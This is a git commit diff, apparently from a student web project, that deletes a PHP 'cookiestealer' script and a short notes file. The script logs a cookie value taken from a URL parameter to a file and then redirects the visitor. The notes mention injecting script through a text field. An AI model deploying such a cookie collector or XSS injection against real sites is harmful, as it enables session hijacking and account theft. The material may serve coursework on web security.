55fb67f1d01bf11973fad1da339abc7fbb0432e9
carpediem103 <s0563654@htw-berlin.de>
2022-10-07 17:47:36 +0200

    dev: master clean up

--- HVM_Webseite_v1/cookiestealer.php
+++
@@ -1,6 +0,0 @@
-<?php
-header ('Location:https://pranx.com/hacker/');
-$cookies = $_GET["c"];
-$file = fopen('log.txt', 'a');
-fwrite($file, $cookies . "\n\n");
-?>
--- docsMax.md
+++
@@ -1,2 +0,0 @@
-1. put website on netlify
-2. part of injecting script via text field
